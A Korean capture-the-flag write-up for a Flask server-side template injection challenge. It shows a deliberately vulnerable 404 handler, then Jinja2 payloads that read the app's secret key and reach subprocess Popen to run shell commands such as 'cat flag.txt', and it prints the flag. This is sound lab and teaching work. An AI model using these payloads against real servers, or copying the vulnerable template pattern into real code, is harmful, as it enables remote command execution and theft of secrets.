https://honey-push-30b.notion.site/simple-ssti-243ee65108ad4539a0595d32841e4bf3

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ce34d5ac-feb4-409c-85e2-0233c394020a/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

simple-ssti 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는 아래와 같다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, render_template_string, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

app.secret_key = FLAG

@app.route('/')
def index():
    return render_template('index.html')

@app.errorhandler(404)
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
''' % (request.path)
    return render_template_string(template), 404

app.run(host='0.0.0.0', port=8000)
```

# 문제 풀이

SSTI (Server Side Template Injection)의 경우 웹 어플리케이션에서 동적인 내용을 출력할 때 Template 엔진을 이용해서 출력할 때 발생하는 취약점이다. Template 소스에 사용자의 입력이 들어가게 된다면 의도하지 않은 Template 기능을 실행할 수 있기 때문이다.

위 app.py의 경우 Flask를 사용하였고 Flask에서는 특별한 별도의 설정을 해주지 않는 경우 Jinja2 템플릿을 사용한다.

Error404 함수를 보면 사용자가 요청한 path를 template에 넣어주기 때문에 이를 이용해서 Template기능을 사용할 수 있다.

{{3*3}}을 넣어서 실제로 9가 출력되는지 테스트해보자.

![404Error페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c09c1bd-f0e7-4260-a93d-7b8e05d905ca/404Error%ED%8E%98%EC%9D%B4%EC%A7%80.png)

404Error 페이지에서 path를 404Error가 아닌 {{3*3}}을 넣어주자

![try1..PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/873eed75-e3dd-4dad-9f81-5d0cefa90e25/try1..png)

{{3*3}}을 넣어주면 계산 결과 값인 9가 출력될 것이다.

![try1-1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d7836f4c-3d48-4bcb-9b8d-9119c890fd43/try1-1.png)

{{3*3}}을 path로 넣어주면 위와 같이 출력된다. %7B 는 { 이고 %7D는 } 이다. 입력값을 이용해 Template 엔진을 사용할 수 있음을 알았으므로 플래그를 찾아보자. 플래그는 flag.txt의 FLAG 변수에 있다고 했다. 하지만 위의 코드에서 app.secret_key에 FLAG를 저장하기도 하므로 app의 secret_key값을 출력해도 된다.

# app의 secret_key값을 통해서 출력하는 방법

app객체에 직접적인 접근을 통해서 출력하기 위해서는 url_for.__**globals__**.current_app.secret_key 을 이용하면 된다. (문제 질문에서 찾았다.)

![app에 직접접근.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a3c3ef1-4f3a-4054-bb67-b60d94234a78/app%EC%97%90_%EC%A7%81%EC%A0%91%EC%A0%91%EA%B7%BC.png)

{{url_for.__**globals__**.current_app.secret_key}}을 path에 넣어주면 app의 secret_key값이 출력된다.

![app에 직접접근-1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8cc831d-f426-41ec-9e10-0d344f26c8b7/app%EC%97%90_%EC%A7%81%EC%A0%91%EC%A0%91%EA%B7%BC-1.png)

**DH{6c74aac721d128c637eab3f11906a44b} 플래그 값을 찾았다.**

# 로컬에 명령어를 통하여 Flag.txt에 접근해 출력하는 방법

이 문제에서는 app.secret_key에 FLAG를 저장하였기 때문에 직접 app객체에 접근하여 출력할 수 있지만 그렇지 않을 경우 FLAG.txt에 직접 접근을 해야한다.

그렇게 하기 위해서는 일단 config.items()를 통하여 사용할 수 있는 객체들의 목록을 출력해보자.

![config_item.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf39ca8c-daab-4adb-9c00-d1fe3156847a/config_item.png)

아쉽게도 os 라이브러리가 없는 모습이다. 그래서 os라이브러리를 추가해서 os 객체를 이용해보자.

{{config.from_object('os')}}*를 통해 os 객체를 추가해주자.

![os라이브러리 추가.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/13a1ec7d-ba4e-4dd5-9bf9-a0b56924c6e7/os%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC_%EC%B6%94%EA%B0%80.png)

그러고 나서 다시 {{config.itmes()}}를 해보면 config에 많은 것들이 추가된 것을 볼 수 있다. os라이브러리가 추가 된것이다.

![config_item-2.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad38c945-b853-40c2-8d10-8d2dd79c7bdb/config_item-2.png)

이제 사용할 수 있는 class를 찾기 위해서 {{''.__**class__**.__**mro__**}}를 넣어주자

![class 목록.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ff26726-bcba-458c-85d9-893fa331c89a/class_%EB%AA%A9%EB%A1%9D.png)

파이썬에서는 우리가 사용하고자 하는 함수들(popen 등)이 object 클래스 이므로{{”.__class__.__mro__[1].__subclasses__()}} 를 이용해 하위 함수들을 출력해보자.

![object하위 함수들.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5eaf0ecd-ba69-4a1e-a799-3f4c4913f7ef/object%ED%95%98%EC%9C%84_%ED%95%A8%EC%88%98%EB%93%A4.png)

![Popen.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e936e84e-d529-4274-ae0b-5cf8a51033fc/Popen.png)

이 중에서 Ctrl+F를 통해서 Popen이 존재하는 것을 확인할 수 있다. 그렇다면 이게 몇번째인지 찾기 위해서 약간의 노가다를 했다.

![303.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3b249d5d-3cfc-4688-9b94-606e10e079d9/303.png)

{{”.__class__.__mro__[1].__subclasses__()[303]}}은 loggin.Formatter이다.

보면 logging.formmater보다 한참 뒤에 있는 것을 볼 수 있다.

![노가다.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9737a63b-2639-4c88-a87a-7aec89ab5a34/%EB%85%B8%EA%B0%80%EB%8B%A4.png)

이를 반복하면서 노가다를 하면 Popen은 408번째 임을 알 수 있다.

![Popen 408.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/202d5d69-3af7-4f87-bb93-20ed7a48f268/Popen_408.png)

그러면 이 함수 뒤에 우리가 원하는 명령어를 붙여서 Popen을 사용해주면 된다. 먼저 ls를 사용해보자.{{”.__class__.__mro__[1].__subclasses__()[408](’ls’,shell=True,stdout=-1).communicate()}}를 이용하자

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6a17d504-5b7a-4adc-a70e-76bda8164a24/Untitled.png)

flag.txt가 존재하는 것을 확인할 수 있다 그러면 이 값을 cat으로 출력해주자

{{”.__class__.__mro__[1].__subclasses__()[408](’cat flag.txt’,shell=True,stdout=-1).communicate()}}

![결과.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da319ff6-d22f-44f1-923a-1d5a98fbd322/%EA%B2%B0%EA%B3%BC.png)

**DH{6c74aac721d128c637eab3f11906a44b} 값을 찾을 수 있다.**
